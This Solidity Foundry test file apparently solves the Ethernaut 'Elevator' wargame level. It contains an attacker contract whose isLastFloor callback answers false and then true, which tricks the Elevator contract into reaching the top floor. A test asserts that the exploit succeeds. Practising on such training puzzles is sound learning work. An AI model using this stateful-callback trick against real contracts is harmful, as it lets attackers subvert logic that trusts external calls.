// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/11_Elevator.sol";

contract BuildingAttack {
    bool hit = false;

    function callElevator(address _elevatorAddress) public{
        Elevator(_elevatorAddress).goTo(10);
    }
    
    function isLastFloor(uint) external returns (bool){
        if(!hit){
            hit=true;
            return false;
        }else{
            return true;
        }
    }
}

contract ElevatorTest is Test {
    Elevator _elevator;
    address deployer;
    address attacker;

    function setUp() public {
        deployer = address(this);
        attacker = vm.addr(1);

        _elevator = new Elevator();
    }

    function testSolution() public {
        vm.startPrank(attacker);

        BuildingAttack _buildingAttack = new BuildingAttack();
        _buildingAttack.callElevator(address(_elevator));

        assertTrue(_elevator.top(), "The elevator has not reached the top!");
    }
}
